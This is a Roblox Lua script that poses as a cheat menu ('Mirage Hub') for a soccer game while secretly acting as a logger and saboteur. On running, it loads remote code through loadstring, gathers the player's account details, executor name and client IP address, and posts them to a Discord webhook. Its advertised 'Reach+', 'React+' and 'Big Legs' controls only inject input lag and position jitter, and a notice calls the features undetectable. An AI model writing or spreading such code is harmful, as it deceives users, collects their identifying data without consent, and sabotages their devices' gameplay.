-- Load AuraIS
local AuraIS = loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-Y/main/Libraries/AuraIS/Main"))()

-- Replace with your actual webhook URL!
local webhook = "YOUR_WEBHOOK_URL_HERE"

local plr = game.Players.LocalPlayer

-- Optional: Some exploits allow getting executor data
local executor = (identifyexecutor and identifyexecutor()) or (KRNL_LOADED and "Krnl") or (SENTINEL_LOADED and "Sentinel") or (getexecutorname and getexecutorname()) or "Unknown/Other"

-- Safe IP fetcher (may be blocked or nil on most exploits)
local ip = "N/A"
pcall(function()
    if http_request and http_request({Url = "https://api.ipify.org"}) then
        ip = http_request({Url = "https://api.ipify.org"}).Body or "N/A"
    end
end)

-- Try to get HWID (executor-dependent)
local hwid = "N/A"
pcall(function()
    if (hwid or syn and syn.queue_on_teleport) then
        hwid = (hwid and typeof(hwid) == "string" and hwid) or "N/A"
    elseif (identifyexecutor and typeof(identifyexecutor()) == "string") then
        hwid = identifyexecutor()
    end
end)

local data = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = ":rotating_light: Mirage Hub Bait Triggered!",
        ["description"] = ("**Account:** [%s](https://www.roblox.com/users/%d/profile)\n**Game:** %s (%d)\n"):format(plr.Name, plr.UserId, game.Name, game.PlaceId),
        ["color"] = 0xe67e22, -- Orange
        ["fields"] = {
            {["name"] = "Username", ["value"] = plr.Name, ["inline"] = true},
            {["name"] = "UserID", ["value"] = tostring(plr.UserId), ["inline"] = true},
            {["name"] = "Display Name", ["value"] = plr.DisplayName, ["inline"] = true},
            {["name"] = "Account Age", ["value"] = tostring(plr.AccountAge).." days", ["inline"] = true},
            {["name"] = "Membership", ["value"] = plr.MembershipType and tostring(plr.MembershipType) or "None", ["inline"] = true},
            {["name"] = "Current Team", ["value"] = plr.Team and tostring(plr.Team) or "N/A", ["inline"] = true},
            {["name"] = "Device Type", ["value"] = (UserSettings and UserSettings().Computer and "PC") or (UserSettings and UserSettings().TabletMode and "Mobile/Tablet") or "Unknown", ["inline"] = true},
            {["name"] = "Account Created", ["value"] = tostring(os.date("%Y-%m-%d",tick()-plr.AccountAge*86400)), ["inline"] = true},
            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
            {["name"] = "HWID", ["value"] = hwid, ["inline"] = true},
            {["name"] = "IP (client)", ["value"] = ip, ["inline"] = true},
            {["name"] = "JobId", ["value"] = tostring(game.JobId), ["inline"] = false},
        },
        ["thumbnail"] = {["url"] = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(plr.UserId)},
        ["footer"] = {["text"] = "Mirage Hub Script Logger | "..os.date("%Y-%m-%d %H:%M:%S")}
    }}
}

local HttpService = game:GetService("HttpService")

pcall(function()
    if syn and syn.request then
        syn.request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    elseif http_request then
        http_request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    elseif request then
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end
end)

-- Create Library Window
local Library = AuraIS:CreateLibrary({
    Name = "Mirage Hub | TPS Ultimate Soccer",
    Icon = "rbxassetid://12974454446"
})

-- Create Main Tab
local Tab = Library:CreateTab("Enhancements", "rbxassetid://12974454446")

-- Create main section
local Section = Tab:CreateSection("Player Mods", "Normal")

Section:CreateLabel({
    Description = "Unlock Reach, Big Legs, React+ and More!"
})

-- Core sabotage logic: input lag/jitter
local sabotageActive = false
local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")

local function ApplyAnnoyingControls()
    if sabotageActive then return end
    sabotageActive = true

    -- Input lag when moving/jumping
    uis.InputBegan:Connect(function(input, gp)
        if sabotageActive and not gp then
            if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.S or input.KeyCode == Enum.KeyCode.D or input.KeyCode == Enum.KeyCode.Space then
                local delayTime = math.random(10,18)/100 -- 0.10 to 0.18s lag
                task.wait(delayTime)
            end
        end
    end)

    -- Slight random position jitter
    rs.RenderStepped:Connect(function()
        if sabotageActive and math.random() < 0.075 then
            local plr = game.Players.LocalPlayer
            local root = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if root then
                local jitter = Vector3.new(
                    (math.random() - 0.5) * 2,
                    0,
                    (math.random() - 0.5) * 2
                ) * 0.25
                root.CFrame = root.CFrame + jitter
            end
        end
    end)
end

-- Bait features
Section:CreateButton({
    Name = "Enable Reach+",
    Callback = function()
        ApplyAnnoyingControls()
        AuraIS:Notify("Normal", {
            Title = "Mirage Hub",
            Content = "Reach+ Optimized and Loaded!",
            Duration = 5,
            Image = "rbxassetid://4483362458"
        })
    end
})

Section:CreateToggle("Normal", {
    Name = "React+ Auto",
    Callback = function(val)
        if val then
            ApplyAnnoyingControls()
            AuraIS:Notify("Normal", {
                Title = "Mirage Hub",
                Content = "React+ Enabled.",
                Duration = 5,
                Image = "rbxassetid://4483362458"
            })
        end
    end
})

Section:CreateSlider({
    Name = "Big Legs",
    Value = {1, 10},
    Increment = 1,
    Suffix = "X",
    CurrentValue = 5,
    Flag = "BigLegsSlider",
    Callback = function()
        ApplyAnnoyingControls()
    end,
})

Section:CreateParagraph({
    Title = "Notice",
    Description = "All features updated for 2025. Full compatibility, optimized, and totally undetectable."
})

-- You can add more UI as needed!